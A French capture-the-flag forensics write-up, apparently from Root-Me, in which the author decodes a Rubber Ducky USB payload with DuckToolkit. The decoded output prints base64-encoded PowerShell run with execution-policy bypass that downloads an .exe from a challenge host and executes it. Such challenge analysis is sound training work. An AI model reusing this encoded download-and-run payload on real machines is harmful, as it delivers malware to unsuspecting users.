+++
author = "Enzo"
title = "Chall - Vilan Petit Canard"
date = "2026-02-04"
categories = [
    "Blue Team"
]
tags = [
    "USB",
    "Rubber Ducky",
    "Forensic",
    "CTF",
    "Chall",
    "Root-Me"
]
+++
## Introduction

L’ordinateur du DSI semble avoir été compromis en interne. Les soupçons se portent sur un jeune stagiaire mécontent de ne pas avoir été payé durant son stage. Une étrange clé USB contenant un fichier binaire a été retrouvée sur le bureau du stagiaire. Le DSI compte sur vous pour analyser ce fichier.

## Recherche
Nous avons un fichier : ``file.bin``. En lançant les commandes de bases (``file``, ``strings``, ``hexdump``, ``xxd`` ...) nous pouvons remarquer que la structure du fichier ressemble fortement à un fichier Rubber Ducky encodé (ex : ``00ff 00ff 00ff`` = Padding HID).

Nous pouvons décoder le fichier avec le tools ``https://github.com/kevthehermit/DuckToolkit`` : 
```Bash
git clone https://github.com/kevthehermit/DuckToolkit.git
cd DuckToolkit
python3 setup.py install
```

Une fois installé, nous pouvons lancer la commane suivante :
```Bash
python3 ducktools.py -d -l gb ../Chall/file.bin output.txt
```

Nous pouvons afficher le fichier ``output.txt`` : 
```Bash
cat output.txt

### La partie qui m'intéresse : 
powershell Start-Process powershell -Verb runAsDELAY
PowerShell -Exec ByPass -Nol -Enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvAGMAaABhAGwAbABlAG4AZwBlADAAMQAuAHIAbwBvAHQALQBtAGUALgBvAHIAZwAvAGYAbwByAGUAbgBzAGkAYwAvAGMAaAAxADQALwBmAGkAbABlAHMALwA2ADYANgBjADYAMQA2ADcANgA3ADYANQA2ADQAMwBmAC4AZQB4AGUAJwAsACcANgA2ADYAYwA2ADEANgA3ADYANwA2ADUANgA0ADMAZgAuAGUAeABlACcAKQA7AApowershell -Exec ByPass -Nol -Enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAGMAbwBtACAAcwBoAGUAbABsAC4AYQBwAHAAbABpAGMAYQB0AGkAbwBuACkALgBzAGgAZQBsAGwAZQB4AGUAYwB1AHQAZQAoACcANgA2ADYAYwA2ADEANgA3ADYANwA2ADUANgA0ADMAZgAuAGUAeABlACcAKQA7AAoAexit
```

Nous pouvons nous rendre sur ``https://gchq.github.io/CyberChef/`` pour décoder le ``base64`` ce qui nous donne le lien d'un ``.exe``. En le téléchargeant et en l'exécutant nous avons le flag pour valider le challenge. 

